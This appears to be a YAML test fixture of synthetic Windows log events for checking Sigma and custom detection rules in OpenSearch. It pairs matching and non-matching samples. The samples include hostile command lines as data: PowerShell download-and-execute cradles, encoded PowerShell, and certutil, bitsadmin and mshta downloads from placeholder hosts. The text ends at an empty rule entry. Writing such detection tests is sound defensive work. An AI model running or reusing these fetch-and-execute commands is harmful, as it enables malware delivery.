# Synthetic events for every rule, in the shape OpenSearch stores them. Sigma rules list single documents.
# Custom rules list scenarios: each is a list of documents, judged as a whole.
# test_live_parity.py runs the Sigma documents on real OpenSearch too.

ps_suspicious_script:
  match:
    - {event: {dataset: windows.powershell, code: '4104'}, winlog: {event_data: {ScriptBlockText: "$c = New-Object Net.WebClient; IEX ($c.DownloadString('http://127.0.0.1/a'))"}}}
    - {event: {dataset: windows.powershell, code: '4104'}, winlog: {event_data: {ScriptBlockText: "invoke-webrequest http://x | iex"}}}
    - {event: {dataset: windows.powershell, code: '4104'}, winlog: {event_data: {ScriptBlockText: "invoke-expression ([Text.Encoding]::UTF8.GetString([Convert]::FROMBASE64STRING($x)))"}}}
  no_match:
    - {event: {dataset: windows.powershell, code: '4104'}, winlog: {event_data: {ScriptBlockText: "Invoke-WebRequest http://x -OutFile y"}}}
    - {event: {dataset: windows.powershell, code: '4104'}, winlog: {event_data: {ScriptBlockText: "Invoke-Expression 'Get-Date'"}}}
    - {event: {dataset: windows.powershell, code: '4100'}, winlog: {event_data: {ScriptBlockText: "IEX ($c.DownloadString('x'))"}}}
    - {event: {dataset: windows.sysmon, code: '1'}, winlog: {event_data: {ScriptBlockText: "IEX ($c.DownloadString('x'))"}}}

proc_encoded_powershell:
  match:
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -NoP -enc UwBlAHQA'}}
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\POWERSHELL.EXE', command_line: 'powershell -EncodedCommand UwBlAHQA'}}
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\tmp\renamed.exe', pe: {original_file_name: PowerShell.EXE}, command_line: 'renamed -e UwBlAHQA'}}
  no_match:
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -ExecutionPolicy Bypass -File a.ps1'}}
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', command_line: 'cmd.exe /c tool -enc value'}}
    - {event: {dataset: windows.sysmon, code: '3'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -enc UwBlAHQA'}}

proc_suspicious_parent_child:
  match:
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', parent: {executable: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'}}}
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', parent: {executable: 'C:\Windows\System32\cscript.exe'}}}
  no_match:
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', parent: {executable: 'C:\Windows\explorer.exe'}}}
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\notepad.exe', parent: {executable: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'}}}
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', parent: {executable: 'C:\tmp\notwinword.exe.bak'}}}

proc_lolbin_download:
  match:
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\certutil.exe', command_line: 'certutil -URLCACHE -f http://x a'}}
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\bitsadmin.exe', command_line: 'bitsadmin /transfer j http://x y'}}
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\mshta.exe', command_line: 'mshta https://x/a.hta'}}
  no_match:
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\certutil.exe', command_line: 'certutil -hashfile a SHA256'}}
    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\curl.exe', command_line: 'curl urlcache'}}

sec_admin_group_add:
  match:
    - {event: {dataset: windows.security, code: '4732'}, winlog: {event_data: {TargetSid: S-1-5-32-544}}}
    - {event: {dataset: windows.security, code: '4732'}, winlog: {event_data: {TargetSid: S-1-5-32-555}}}
  no_match:
    - {event: {dataset: windows.security, code: '4732'}, winlog: {event_data: {TargetSid: S-1-5-32-545}}}
    - {event: {dataset: windows.security, code: '4733'}, winlog: {event_data: {TargetSid: S-1-5-32-544}}}

proc_uac_bypass_parent:
